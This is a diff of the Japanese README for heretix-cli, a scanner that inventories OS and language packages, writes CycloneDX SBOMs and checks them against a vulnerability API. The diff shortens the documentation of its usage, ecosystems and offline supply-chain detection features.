@@ -1,579 +1,145 @@
 # heretix-cli
 
-**[heretix](https://titeee.github.io/heretix-web/)** プロジェクトの一部 — サーバ・コンテナ・ネットワーク機器（ファイアウォール・VPN）を横断してCVEを一元管理する、セルフホスト型の脆弱性管理スイートです（Apache-2.0）。
-
-このリポジトリ heretix-cli は、収集エージェントです。Linux/Windows サーバや Docker コンテナイメージの OS パッケージ（RPM, DPKG, APK）および OSS エコシステム（PyPI, npm/yarn/pnpm, Go modules, Composer, Maven, Gradle, JAR/WAR アーカイブ）をスキャンし、[heretix-api](https://github.com/TITeee/heretix-api) に問い合わせて既知の脆弱性を検出します。出力は CycloneDX SBOM（または heretix 独自の inventory JSON）として [heretix-management](https://github.com/TITeee/heretix-management) へのインポートに対応。API なしで動作するローカルセキュリティ検知として、**GlassWorm**（不可視文字によるマルウェア混入）、**Dependency Confusion**（パッケージ置換攻撃）、**Malicious Install Scripts**（悪意ある install スクリプト。Shai-Hulud ワームのシグネチャを含む）、**CI/CD Pipeline Poisoning**（パイプライン汚染）、**Lock File Integrity**（ロックファイル整合性）の検出に対応。
+heretix-cli は、**[heretix](https://titeee.github.io/heretix-web/)** のスキャナーです。heretix は、サーバー・コンテナ・ネットワーク機器（ファイアウォール、VPN など）の CVE を 1 つのインベントリで管理する、セルフホスト型のツール群です（Apache-2.0）。
 
 [English README](README.md)
 
+## 概要
+
+サーバー上で実行するか、ディレクトリやコンテナイメージを指定して実行します。インストールされているパッケージを洗い出し、そのうちどれに脆弱性があるかを [heretix-api](https://github.com/TITeee/heretix-api) に問い合わせます。
+
+```
+$ heretix-cli scan --image myapp:latest --api-url http://localhost:5000
+   ECOSYSTEM   PACKAGE               VERSION    SOURCE               DB    VULN ID               CVSS   EPSS  SUMMARY
+!  AlmaLinux   curl                  7.88.1     rpm                  nvd   CVE-2024-1234          9.8  0.950  Remote code exec
+   PyPI        requests              2.31.0     /srv/myapp/requir... osv   GHSA-xxxx-yyyy         6.1  0.045  SSRF via proxy
+ B Debian      binutils(2 pkgs)      2.44-3     dpkg                 osv   CVE-2024-9999          5.5  0.002  Heap overflow in BFD
+...
+Summary: 14 packages with 21 findings (1 malware, 1 KEV)
+```
+
+OS パッケージ（RPM、DPKG、APK）はパッケージデータベースから直接読み取ります。言語パッケージ（PyPI、npm、Go、Composer、Maven、Gradle、Java アーカイブ）は、ロックファイル、インストール済みパッケージのメタデータ、コンパイル済みバイナリから読み取ります。
+
+heretix 全体の構成は次のとおりです。
+
+```
+ サーバー / ディレクトリ / コンテナイメージ
+            │
+            ▼
+       heretix-cli ── collect ──► CycloneDX SBOM ──► heretix-management（インポート）
+            │
+            └── check / scan ── 検索 ──► heretix-api
+            │
+            ▼
+ 脆弱性レポート（表形式または JSON、CI 用の終了コード）
+```
+
+- **heretix-cli**（このリポジトリ）: パッケージを洗い出し、SBOM として書き出すか、その場で脆弱性を照合します。
+- **[heretix-api](https://github.com/TITeee/heretix-api)**: パッケージのバージョンごとに、脆弱性があるかどうかを返します。
+- **[heretix-management](https://github.com/TITeee/heretix-management)**: SBOM を取り込み、インベントリと検出結果を継続的に管理します。
+
+`collect` と `detect` は API を使わずオフラインで動くため、SBOM の生成やサプライチェーン攻撃の検知だけを目的に、heretix-cli 単体で使うこともできます。
+
+## 特徴
+
+- **ホスト、ディレクトリ、コンテナイメージに対応**: イメージは、ローカルの Docker デーモンにあればそこから読み、なければレジストリから直接取得します。Docker 自体は必須ではありません。
+- **CycloneDX 1.6 形式の SBOM**: PURL、依存関係グラフ、ライセンス、ハッシュ、直接依存か間接依存かを出力します。
+- **イメージスキャンのノイズを抑制**: 同じソースパッケージから作られた複数のバイナリパッケージに共通する脆弱性は、1 件にまとめて報告します。カーネルヘッダーやビルドツールチェーンは「実行時に使われないパッケージ」として区別します。また、ディストリビューションのパッケージがインストールした言語パッケージ（例: `python3-urllib3` が置いたファイル）は、上流のバージョンではなく OS パッケージとして照合します。
+- **オフラインで動くサプライチェーン攻撃の検知**: GlassWorm（不可視文字）、Dependency Confusion、悪意のあるインストールスクリプト（Shai-Hulud、RedC2）、CI/CD パイプラインの汚染、ロックファイルの整合性を検査します。
+- **CI での利用を想定**: 検出があれば終了コード 1 を返し、JSON 形式でも出力できます。GitHub の依存関係グラフに送信して Dependabot に通知させることもできます。
+
 ## 対応エコシステム
 
-| エコシステム | スキャン対象 | 対応プラットフォーム |
-|---|---|---|
-| RHEL / AlmaLinux / Rocky Linux / Oracle Linux / CentOS (RPM) | `var/lib/rpm` / `usr/lib/sysimage/rpm` を直接パース（BDB、NDB、SQLiteいずれの形式にも対応） | Linux のみ |
-| Debian / Ubuntu 系 (DPKG) | `var/lib/dpkg/status` を直接解析 | Linux のみ |
-| Alpine (APK) | `/lib/apk/db/installed` を直接解析 | Linux のみ |
-| PyPI | `site-packages`/`dist-packages`（`*.dist-info/METADATA`）を一次収集源とし、加えて `requirements.txt`, `Pipfile.lock`, `poetry.lock`, `uv.lock` / フォールバック: `pip list`* | Linux / Windows |
-| npm / yarn / pnpm | `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` / フォールバック: `npm list -g`, `pnpm list -g`* | Linux / Windows |
-| Go (go modules) | `go.mod` / フォールバック: `go list -m -json all` | Linux / Windows |
-| Go (バイナリ) | コンパイル済みバイナリに静的リンクされたモジュール（ベースイメージに同梱されたツール等）を、バイナリに埋め込まれたビルド情報から読み取る — `go version -m` と同じ情報源† | イメージスキャンのみ |
-| Composer (PHP) | `composer.lock` | Linux / Windows |
-| Maven (Java) | `pom.xml` / フォールバック: `mvn dependency:tree` | Linux / Windows |
-| Gradle (Java/Kotlin) | `gradle.lockfile` / `build.gradle` / `build.gradle.kts` | Linux / Windows |
-| Java アーティファクト | `*.jar`, `*.war`, `*.ear` — `META-INF/maven/*/pom.properties` を読み、`WEB-INF/lib` / `BOOT-INF/lib` を再帰的に解析 | Linux / Windows |
+| エコシステム | 読み取り元 |
+|---|---|
+| RPM（RHEL、AlmaLinux、Rocky Linux、Oracle Linux、CentOS） | RPM データベース（BDB、NDB、SQLite） |
+| DPKG（Debian、Ubuntu） | `/var/lib/dpkg/status` |
+| APK（Alpine） | `/lib/apk/db/installed` |
+| PyPI | `site-packages`、`requirements.txt`、`Pipfile.lock`、`poetry.lock`、`uv.lock` |
+| npm / yarn / pnpm | `package-lock.json`、`yarn.lock`、`pnpm-lock.yaml` |
+| Go | `go.mod`、Go バイナリに埋め込まれたモジュール情報（イメージスキャン時） |
+| Composer（PHP） | `composer.lock` |
+| Maven / Gradle | `pom.xml`、`gradle.lockfile`、`build.gradle(.kts)` |
+| Java アーカイブ | `*.jar`、`*.war`、`*.ear` |
 
-\* システム全体をスキャンする場合（`--scan-path` がファイルシステムのルート — `--image` 未指定時のデフォルト）にのみ実行される。`--image`/`--dockerfile` スキャン時、および `--scan-path` がルートより狭い場合はスキップされる。`pip`/`npm`/`pnpm` は `--scan-path` の値に関係なく常にこのプロセス自身のホスト環境を見てしまい、展開したイメージやスキャン対象のサブディレクトリを見るわけではないため。
-
-† `--image`/`--dockerfile` スキャン時のみ実行され、展開したrootfs配下の全ファイルを走査してGoバイナリとして解析を試みる。ホストスキャンでは対象外（稼働中のホスト上で実行ファイルを片っ端から開くのは、イメージレイヤー1つを監査するのに比べて格段にノイズが多く低速なため）。
+OS パッケージのデータベースは、Linux ホストで読み取れるほか、イメージスキャンであればどの OS からでも読み取れます。フォールバックの動作、読み取り元ごとの詳細、実行時に使われないパッケージや OS 管理のパッケージの扱いは、[docs/package-detection.md](docs/package-detection.md)（英語）を参照してください。
 
 ## インストール
 
-### ビルド
+単一の静的バイナリをビルドし（Go 1.25 以上）、対象のマシンにコピーするだけで使えます。実行時に必要なものはありません。
 
 ```bash
-# Linux 向け静的バイナリ
+# Linux 向け
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o heretix-cli .
 
-# Windows 向けバイナリ
+# Windows 向け
 GOOS=windows GOARCH=amd64 go build -o heretix-cli.exe .
 ```
 
-生成されたバイナリを対象サーバにコピーするだけでデプロイ完了。
+## クイックスタート
 
-### 依存パッケージ
-
-```bash
-go mod tidy
-```
-
-## 使い方
-
-### パッケージ収集 (`collect`)
-
-システムをスキャンし、インストール済みパッケージを CycloneDX SBOM として出力する。オフラインで実行可能。
+`check` と `scan` を使うには、heretix-api が動いている必要があります。heretix-api の[クイックスタート](https://github.com/TITeee/heretix-api/blob/main/README.ja.md)を参照してください。API キーは `--api-key` オプションか、環境変数 `HERETIX_API_KEY` で渡します。
 
 ```bash
-heretix-cli collect
-heretix-cli collect --output packages.json --scan-path /srv
-heretix-cli collect --skip npm,pypi --verbose
+export HERETIX_API_KEY=<API キー>
 
-# Docker イメージをスキャン
-heretix-cli collect --image nginx:latest --output nginx-sbom.json
-heretix-cli collect --image registry.example.com/myapp:v1.2 --output myapp-sbom.json
+# このホストをスキャンして脆弱性を表示する
+heretix-cli scan --api-url http://localhost:5000
 
-# Dockerfile の FROM ベースイメージも含めてスキャン
-heretix-cli collect --image myapp:latest --dockerfile ./Dockerfile --output full-sbom.json
-```
+# コンテナイメージをスキャンする
+heretix-cli scan --image nginx:latest --api-url http://localhost:5000
 
-> **非推奨:** `--format json`（heretix 独自インベントリ形式）は引き続き動作し `check`/`submit` からも読めるが、将来のリリースで削除予定。新規スクリプトでは `--format json` を使わないこと。
-
-> **CycloneDX SBOM 出力には以下が含まれる:**
-> - OS パッケージ（apk/rpm/deb）の **PURL に `?distro=` qualifier** を付与。RPM はさらに **`arch=`** と、非ゼロの場合は **`epoch=`** を付与（コンポーネントの `version` は rpm の表示どおり epoch 付きのまま）:
->   ```
->   pkg:apk/alpine/curl@7.79.1-r0?distro=alpine-3.18
->   pkg:rpm/almalinux/curl@7.76.1-26.el9?arch=x86_64&distro=almalinux-9
->   pkg:rpm/rocky/openssl-libs@3.0.7-24.el9?arch=x86_64&distro=rockylinux-9&epoch=1
->   ```
->   Trivy が前提とする PURL 仕様どおりの形式。`trivy sbom` は Rocky/Oracle Linux のアドバイザリをパッケージの arch と完全一致でしか照合せず、バージョン内の epoch は読み落とす。
-> - 全コンポーネントに **`bom-ref`** を設定（PURL と同値、依存グラフの参照解決に必要）
-> - lockfile の integrity ハッシュを **`hashes`** に格納（npm/pnpm は SHA-512、PyPI は SHA-256）
-> - **`licenses`** をコンポーネントに付与（APK, RPM, Composer, npm node_modules, PyPI site-packages から取得）
-> - direct/indirect を示す **`properties[heretix:direct]`** プロパティ。CycloneDX 標準の表現として、`metadata.component` から各直接依存への **`bom.dependencies`** エッジも出力（direct を判定できたコレクターが無い場合は出力しない）。`cdx:` は CycloneDX 自身の公式プロパティ用に予約された名前空間（[cyclonedx-property-taxonomy](https://github.com/CycloneDX/cyclonedx-property-taxonomy)）のため、heretix 独自の名前空間を使用。**破壊的変更（2026-09）:** 旧バージョンは `cdx:direct` という名前で出力していた。古い SBOM は `collect` で再生成するか、そのまま使う場合は上記の `bom.dependencies` ルートエッジにフォールバックする（direct 判定は完全に同等、lockfile 由来の indirect 判定は誤判定ではなく未分類に後退するのみ）。今バージョンは `cdx:direct` を読み戻さない。
-> - 本番ビルドに含まれない dev/test 専用パッケージ、非ランタイムと分類された OS パッケージ、および OS パッケージが入れた言語パッケージを示す **`scope: excluded`**（対応状況は下表の `scope` 列、[非ランタイムパッケージ](#非ランタイムパッケージ)、[OS 管理の言語パッケージ](#os-管理の言語パッケージ) を参照）
-> - OS バイナリパッケージのビルド元ソースパッケージ名を示す **`properties[heretix:source-package]`**、および非ランタイム・OS 管理のパッケージに付与される **`properties[heretix:category]`**（`kernel` / `build` / `os-managed`）
-> - **`bom.dependencies`** セクションによる依存グラフ（npm package-lock.json, pnpm-lock.yaml, uv.lock, poetry.lock, composer.lock）
-> - コンテナスキャン時は **`metadata.component`** に OCI PURL とイメージ digest を記録
-> - OS を検出した場合は **`operating-system` 型のコンポーネント**（os-release の `ID` / `VERSION_ID`、description にプリティネーム）を出力
-
-| フラグ | デフォルト | 説明 |
-|---|---|---|
-| `--output` | `sbom.json` | 出力ファイルパス |
-| `--format` | `cyclonedx` | 出力形式: `cyclonedx`（CycloneDX BOM）/ `json`（heretix インベントリ、非推奨） |
-| `--scan-path` | `/`（Linux）/ `%SystemDrive%\`（Windows） | ファイルシステムの探索ルートパス |
-| `--skip` | (なし) | スキップするソース (例: `--skip npm`) |
-| `--verbose` | `false` | 詳細ログ出力 |
-| `--image` | (なし) | スキャンする Docker イメージ参照 (例: `nginx:latest`) |
-| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
-
-#### lockfile 別 SBOM / インベントリ対応状況
-
-各 lockfile から取得できるメタデータフィールドの対応表。
-`✓`=完全対応、`△`=部分対応（注記参照）、`—`=フォーマット上取得不可。
-
-| lockfile | パッケージ収集 | `direct` | `deps` | `integrity` | `license` | `scope` |
-|---|---|---|---|---|---|---|
-| `package-lock.json` v2/v3 | ✓ | ✓ | ✓ | ✓ | △ ⁴ | ✓ ¹⁴ |
-| `package-lock.json` v1 | ✓ | — | — | — | △ ⁴ | — |
-| `yarn.lock` | ✓ | — | — | — | △ ⁴ | — |
-| `pnpm-lock.yaml` v9 | ✓ | ✓ | ✓ | ✓ | △ ⁴ | ✓ ¹⁴ |
-| `pnpm-lock.yaml` v5/v6 | ✓ | ✓ | — | ✓ | △ ⁴ | — |
-| `requirements.txt` | △ `==` のみ | ✓ | — | △ `--hash=` 付きのみ | △ ⁵ | — |
-| `Pipfile.lock` | ✓ | ✓ | — | ✓ | △ ⁵ | ✓ ¹⁴ |
-| `poetry.lock` | ✓ | — ¹ | ✓ | — | △ ⁵ | — |
-| `uv.lock` | ✓ | ✓ | ✓ | ✓ | △ ⁵ | — |
-| `go.mod`（直接解析） | △ 宣言済みのみ | ✓ | — | — | △ ¹¹ | — |
-| `go list`（フォールバック） | ✓ transitive 含む | — ² | — | — | △ ¹¹ | — |
-| `composer.lock` | ✓ | △ ³ | ✓ | — | ✓ | ✓ ¹⁴ |
-| `pom.xml`（mvn コマンド） | ✓ transitive 含む | ✓ | ✓ | — | △ ⁶ | ✓ ¹⁵ |
-| `pom.xml`（直接解析） | △ 宣言済みのみ | △ | — | — | △ ⁶ | ✓ ¹⁵ |
-| `gradle.lockfile` | ✓ transitive 含む | — ⁷ | ✓ | — | △ ¹² | ✓ ¹⁴ |
-| `build.gradle(.kts)`（直接解析） | △ 宣言済みのみ | △ | — | — | △ ¹² | ✓ ¹⁵ |
-| `*.jar` / `*.war` / `*.ear` | ✓ ⁸ | — ⁹ | — | ✓ SHA-256 | △ ¹⁰ | — |
-| RPM | ✓ | — | — | — | ✓ | ✓ ¹⁶ |
-| DPKG | ✓ | — | — | — | △ ¹³ | ✓ ¹⁶ |
-| APK | ✓ | — | — | — | ✓ | ✓ ¹⁶ |
-
-¹ poetry.lock の `direct` 判定は `pyproject.toml` の読み取りが必要なため未実装。  
-² `go` コマンドが利用可能な場合は `go list` を優先するため transitive deps が取れるが、`direct` 情報は失われる。  
-³ composer.lock の `direct` 判定は同ディレクトリに `composer.json` が必要。  
-⁴ npm の `license` は `node_modules/*/package.json` から取得（パッケージがインストール済みの場合のみ）。lockfile 解析、pnpm virtual store、`npm`/`pnpm` グローバルインストールのフォールバック（`npm root -g`/`pnpm root -g`）のすべてに対応。  
-⁵ PyPI の `license` は `site-packages/*.dist-info/METADATA` から取得（パッケージがインストール済みの場合のみ）。  
-⁶ Maven の `license` は `pom.xml` の `<licenses>` タグから取得（ルートプロジェクトのライセンスのみ、transitive 依存のライセンスは含まれない）。  
-⁷ `gradle.lockfile` では `direct` 情報が利用不可（すべての依存がフラット化された形式）；`direct: null` で不明を示す。  
-⁸ 座標は `META-INF/maven/{groupId}/{artifactId}/pom.properties` から取得し、無い場合は `MANIFEST.MF` の `Implementation-Vendor-Id`/`-Title`/`-Version` が揃っていればそれを使う。どちらも無いアーカイブはファイル名から推測せずスキップする（groupId を欠いた PURL はどの脆弱性情報にもマッチしないため）。ネストしたアーカイブは `app.war!/WEB-INF/lib/lib.jar` の形式で記録する。  
-⁹ ビルド済みアーティファクトには直接依存か推移的依存かの記録が無い。同じパッケージが `pom.xml` からも検出された場合は1件にマージされ、ビルド定義側の `direct` が採用される。  
-¹⁰ `license` は `pom.properties` と同じディレクトリに埋め込まれた `pom.xml` から取得する（Maven でビルドされた JAR のみ）。  
-¹¹ Go の `license` は `GOMODCACHE` 内のモジュールの `LICENSE`/`LICENSE.md`/`LICENSE.txt`/`LICENCE`/`COPYING` ファイルから取得し、冒頭部分を既知のライセンス見出し（MIT, Apache-2.0, BSD-2/3-Clause, MPL-2.0, GPL/LGPL-3.0, ISC, Unlicense）と照合して判定する。事前にローカルビルドが必要 — モジュールキャッシュはコンテナイメージの外にあるため、ライブホストスキャンでのみ有効。  
-¹² Gradle の `license` はローカルの Gradle モジュールキャッシュ（デフォルト `~/.gradle/caches/modules-2/files-2.1`、または `$GRADLE_USER_HOME`）内の依存先 POM から取得する — Go と同じくライブホスト限定。  
-¹³ DPKG の `license` は `/usr/share/doc/{package}/copyright`（DEP-5 machine-readable format の `License:` フィールド）から取得する — 多くのパッケージで存在するが、自由形式の copyright ファイルを使う upstream もあるため保証はない。  
-¹⁴ `scope: excluded` は、devDependencies / `packages-dev` / `develop` / test専用の Gradle configuration からのみ解決されるパッケージ ― lockfile の依存グラフには存在するが、本番ビルド（`pnpm prune --prod` など）には含まれない ― を示す。`—` の場合は、dev/test専用パッケージも本番パッケージと同様、区別なく報告される。  
-¹⁵ Maven と Gradle のビルドファイル直接解析パスは、`scope=test`（Maven）/ test専用 configuration（Gradle）の依存をタグ付けせず、そもそも出力から除外する。タグ付けではなくフィルタリングによる対応だが、実質的な結果は同じ。  
-¹⁶ OS パッケージの `scope: excluded` は、カーネルヘッダとビルドツールチェーンを示す。各バイナリパッケージのビルド元ソースパッケージから判定する ― [非ランタイムパッケージ](#非ランタイムパッケージ) を参照。
-
-`deps` の PURL、`integrity` ハッシュ、および `license` 情報は、CycloneDX 出力の `bom.dependencies`、`components[].hashes`、`components[].licenses` にそれぞれ反映される。`license` 文字列が実際に有効な SPDX ライセンス ID・式である場合（npm・Composer は元から SPDX 形式）は `license.id`/`license.expression` に、そうでない場合（rpm 独自の "GPLv2+ and MIT" のような構文、dpkg copyright の自由記述など）は `license.name` に出力する — CycloneDX の仕様上、この2フィールドには実際の SPDX ID・式しか入れられないため。
-
-### 脆弱性チェック (`check`)
-
-collect で出力した SBOM（CycloneDX、または非推奨の heretix インベントリ JSON）を読み込み、脆弱性 API に問い合わせる。
-
-```bash
-heretix-cli check sbom.json
-heretix-cli check sbom.json --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
-heretix-cli check sbom.json --format json > results.json
-```
-
-| フラグ | デフォルト | 説明 |
-|---|---|---|
-| `--api-url` | `http://localhost:3001` | heretix-api の URL |
-| `--api-key` | (なし) | API 認証キー（環境変数 `HERETIX_API_KEY` でも設定可） |
-| `--format` | `table` | 出力形式: `table` / `json` |
-| `--severity` | `0.0` | CVSS スコアの最小閾値。CVSS スコアが無く severity 評価のみの脆弱性は、その評価の上限が閾値に届けば残す（CRITICAL は 10.0、HIGH は 8.9、MEDIUM は 6.9、LOW は 3.9 まで） |
-| `--concurrency` | `10` | 並行 API リクエスト数 |
-| `--timeout` | `30s` | リクエストごとのタイムアウト |
-| `--runtime-only` | `false` | ランタイムパッケージのみ報告する（カーネルヘッダ・ビルドツールチェーンの検知を非表示） |
-| `--verbose` | `false` | 詳細ログ出力 |
-
-#### 非ランタイムパッケージ
-
-コンテナイメージには、インストールされてはいるが決して実行されないパッケージが含まれることが多い。**カーネルヘッダ**（実際に動くのはホストのカーネルであり、`linux-libc-dev` のコードではない）と、ビルドステージの残骸である**ビルドツールチェーン**（コンパイラ、リンカ、`-dev`/`-devel` ヘッダパッケージ）である。`wordpress:php8.5-fpm` では、これらが全721件中454件を占め、`linux-libc-dev` 単体で388件に達する。
-
-`collect` は、各バイナリパッケージの**ビルド元ソースパッケージ**からこれらを判定する ― dpkg status の `Source:`、RPM データベースの `SourceRpm`、APK データベースの `o:` である。パッケージ名ではなくソースパッケージを使うのは、1つの上流プロジェクトが名前からは判別できない複数のバイナリパッケージに分割されるためである。`libbinutils`・`libctf0`・`libsframe1`・`libgprofng0` はいずれも `Section: libs` であり、共通のソースパッケージ `binutils` だけがビルドツールチェーンであることを示している。
-
-同じソースパッケージ情報から、2つの帰結が得られる:
-
-- **検知件数はバイナリパッケージ単位ではなくソースパッケージ単位で数える。** 1件の `binutils` の CVE は8つのバイナリパッケージすべてに影響するが、8行ではなくソースパッケージ名を示す `binutils(8 pkgs)` の1行になる。バイナリパッケージ名を1つ選ぶのではなくソースパッケージ名を表示するのは、複数バイナリを持つソースパッケージの大半には、ソースと同名のバイナリパッケージが存在しないためである（`glibc` は `libc6`/`libc6-dev` 等を生成するが、`glibc` という名前のバイナリパッケージは存在しない）。グループ内のバイナリパッケージがバージョンを共有していない場合、VERSION 列は特定の1つを選ばず `multiple` と表示する。
-- **非ランタイムの検知は隠さずタグ付けする。** レポート上で `K`（kernel）/ `B`（build）と印を付け、`Non-runtime:` 行に内訳を示す。黙って消えるものは無い。除外したい場合は `--runtime-only` を指定する。1つのソースパッケージがランタイムと非ランタイムの両方のバイナリパッケージを生成することがある（`glibc` は `libc6` と `libc6-dev` の両方を生成する）。同じ CVE がその両方に影響する場合、その行は非ランタイムとしてタグ付けされない。これにより、`--runtime-only` が実際にランタイムへ影響する検知を黙って除外してしまうことを防いでいる。
-
-`wordpress:php8.5-fpm` での実測値: 対応前1485件 → ソースパッケージ単位の集約後 **721件** → `--runtime-only` 指定時 **267件**。
-
-SBOM はこの処理の影響を受けない。すべてのパッケージが component として残る（CycloneDX の `scope: excluded` と `heretix:category` プロパティが付く）。component を削除すると、完全な SBOM が備えるべき網羅性が損なわれるためである。
-
-`--runtime-only` はテーブル表示だけでなく `check`/`scan` の CI/CD 用終了コード（検知が残っていれば1）も変える。`--runtime-only` で無視すると指定したカーネルヘッダ/ビルドツールチェーンのCVEだけでビルドが失敗することは無い。
-
-#### OS 管理の言語パッケージ
-
-ディストロは多くの言語ライブラリを自前のパッケージとして配布している。`python3-urllib3` は urllib3 の `site-packages` ディレクトリを入れ、`nodejs` の rpm は npm とその依存を `/usr/lib/node_modules` に同梱し、`maven` 系の rpm は jar を `/usr/share/java` に置き、`delve` は Go バイナリ `/usr/bin/dlv` を入れる。PyPI・npm・Maven・Go バイナリのコレクタもこれらのファイルを見つけるため、同じライブラリを上流バージョンでもう一度報告してしまう（`python3-urllib3 1.26.5-8.el9_8` と並んで `urllib3 1.26.5`）。上流バージョンにはディストロが自分のリリースにバックポートした修正が反映されないため、照合すると、ディストロが修正済みまたは影響なしとしている検知や、OS パッケージ自身のアドバイザリと重複する検知が返ってくる。
-
-`collect` は、パッケージ DB が保持するファイル一覧（RPM データベース、`/var/lib/dpkg/info/*.list`、APK データベース）を読む。言語パッケージの根拠ファイル（`dist-info/METADATA`、`.jar`、Go バイナリ）をいずれかの OS パッケージが所有していれば、`os-managed` と分類して `scope: excluded` にする。パスからの推測ではなく、記録された所有関係で判定するため、pip・npm・イメージ自身のビルドがディストロのコピーの隣に置いたパッケージは、どの OS パッケージにも所有されておらず対象にならない。
-
-- **問い合わせず、タグ付けもしない。** 非ランタイムパッケージと異なり、OS 管理のパッケージは脆弱性 API に送らない。検知は OS パッケージの側に属し、そちらは通常どおりチェックされる。SBOM には `heretix:category: os-managed` 付きの component として残る。
-- **別のコピーが優先される。** 同じ名前・バージョンが、どの OS パッケージにも所有されていない場所（`requirements.txt` の固定、venv、イメージのビルドがコピーしたバイナリ）でも見つかった場合、まとめられたパッケージは OS 管理とせずチェックする。Go の `stdlib` をバイナリごとに記録するのはこのためで、ある stdlib バージョンが OS 管理として残るのは、そのバージョンでビルドされたバイナリがすべて OS 所有の場合に限られる。
-- **Windows ホスト:** NTFS に展開したイメージでは、dpkg のアーキテクチャ付き一覧（`libc6:amd64.list`）が失われる（ファイル名に `:` を使えないため）。言語ライブラリはほぼすべて `Architecture: all` のパッケージで、その一覧は影響を受けない。
-
-### 一気通貫スキャン (`scan`)
-
-collect と check をワンコマンドで実行する。中間ファイル不要。
-
-```bash
-# ライブシステムスキャン
-heretix-cli scan
-heretix-cli scan --scan-path /srv --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
-
-# Docker イメージスキャン
-heretix-cli scan --image nginx:latest --api-url http://heretix-api:5000 --api-key your-secret-key
-heretix-cli scan --image 123456789.dkr.ecr.ap-northeast-1.amazonaws.com/myapp:v1.2 --severity 7.0
-
-# Dockerfile の FROM ベースイメージも含めて一括スキャン
-heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile --api-url http://heretix-api:5000
-
-# 環境変数で API キーを指定
-HERETIX_API_KEY=your-secret-key heretix-cli scan --api-url http://heretix-api:5000
-```
-
-`--image` フラグ指定時は Docker デーモンをまず参照し、見つからない場合はレジストリから直接 pull します。レジストリ認証は `~/.docker/config.json` から自動読み込みされます（ECR, GCR, Docker Hub 対応）。
-
-`--image` 指定時、生成される SBOM の `hostname` はマシンのホスト名ではなく**イメージ参照**（例: `nginx:latest`）に設定されます。これにより、複数のイメージを heretix-management にインポートした際に各イメージが独立したアセットとして管理されます。
-
-上記コマンドは `collect` と `check` の全フラグを継承する。
-
-| フラグ | デフォルト | 説明 |
-|---|---|---|
-| `--image` | (なし) | スキャンする Docker イメージ参照 |
-| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
-| `--skip-local` | `false` | ローカルセキュリティ検知をスキップ（GlassWorm・Dependency Confusion・Malicious Install・CI/CD Poisoning・Lock File Integrity） |
-| `--check-registry` | `false` | 未知の npm スコープを npmjs.org に問い合わせて判定（ネットワーク必須） |
-| `--runtime-only` | `false` | ランタイムパッケージのみ報告する（[非ランタイムパッケージ](#非ランタイムパッケージ) を参照） |
-
-### GitHub Dependency Submission (`submit`)
-
-SBOM(CycloneDX、または非推奨の heretix インベントリ JSON)を読み込み、[GitHub Dependency Submission API](https://docs.github.com/en/rest/dependency-graph/dependency-submission) に送信する。送信後、Dependabot が検出パッケージの既知の脆弱性に対してアラートを生成する。
-
-```bash
-# GitHub Actions での典型的な使い方（環境変数は Actions が自動設定）
+# 2 段階に分ける場合: SBOM を書き出し（オフライン）、あとで照合する
 heretix-cli collect --output sbom.json
-heretix-cli submit sbom.json
+heretix-cli check sbom.json --api-url http://localhost:5000
 
-# 手動実行
-heretix-cli submit sbom.json \
-  --token ghp_xxx \
-  --repo owner/repo \
-  --sha $(git rev-parse HEAD) \
-  --ref refs/heads/main
-```
-
-| フラグ | デフォルト | 説明 |
-|---|---|---|
-| `--token` | `$GITHUB_TOKEN` | `contents: write` 権限を持つ GitHub トークン |
-| `--repo` | `$GITHUB_REPOSITORY` | `owner/repo` 形式のリポジトリ名 |
-| `--sha` | `$GITHUB_SHA` | スナップショットと紐付けるコミット SHA |
-| `--ref` | `$GITHUB_REF` | Git ref（例: `refs/heads/main`） |
-| `--correlator` | `heretix-cli` | 検出器を識別する文字列。同じ値で送信すると前回のスナップショットを上書き |
-| `--job-id` | `$GITHUB_RUN_ID` | 今回の実行を識別する一意 ID |
-
-lockfile から検出されたパッケージはソースファイル単位でマニフェストにグループ化される。`go.mod` の `// indirect`・`package-lock.json` のルート `dependencies`・`pnpm-lock.yaml` の `importers:` から判定した direct 依存は `relationship: "direct"` で送信される。
-
-### ローカル検知のみ実行 (`detect`)
-
-脆弱性 API を使わず、ローカルセキュリティ検知だけを実行する。オフラインで動作可能。
-
-```bash
-heretix-cli detect
+# ローカルのセキュリティ検査だけを行う（オフライン）
 heretix-cli detect --scan-path /srv/myapp
-heretix-cli detect --format json
-
-# Docker イメージをスキャン
-heretix-cli detect --image nginx:latest
-heretix-cli detect --image myapp:latest --dockerfile ./Dockerfile
 ```
 
-| フラグ | デフォルト | 説明 |
+`sbom.json` を heretix-management にインポートすると、検出結果を継続的に追跡できます。
+
+## コマンド
+
+| コマンド | 用途 | heretix-api |
 |---|---|---|
-| `--scan-path` | `/`（Linux）/ `%SystemDrive%\`（Windows） | ファイルシステムの探索ルートパス |
-| `--image` | (なし) | スキャンする Docker イメージ参照 |
-| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
-| `--format` | `table` | 出力形式: `table` / `json` |
-| `--verbose` | `false` | 詳細ログ出力 |
-| `--check-registry` | `false` | 未知の npm スコープを npmjs.org に問い合わせて判定（ネットワーク必須） |
+| `collect` | ホスト、ディレクトリ、イメージをスキャンし、パッケージ一覧を CycloneDX SBOM として書き出す | 不要 |
+| `check` | SBOM を heretix-api で照合する | 必要 |
+| `scan` | `collect`、`check`、ローカル検査を 1 回で実行する | 必要 |
+| `detect` | ローカルのセキュリティ検査だけを行う | 不要 |
+| `submit` | SBOM を GitHub の Dependency Submission API に送信する（Dependabot 用） | 不要 |
 
-## ローカルセキュリティ検知
+すべてのオプション、出力形式、そのほかの使用例は [docs/commands.md](docs/commands.md)（英語）を参照してください。
 
-> **ベータ版**: ローカルセキュリティ検知は現在ベータ版です。検知ルールは誤検知を含む場合があり、今後のリリースでカバレッジが拡充される予定です。
+## CI での利用
 
-`scan` および `detect` コマンドは、ネットワークアクセスを必要としない 5 種類のローカル検知を実行します。
-
-**自動スキップパス** — 誤検知防止と不要な I/O 削減のため、以下のディレクトリを自動的にスキップします。
-
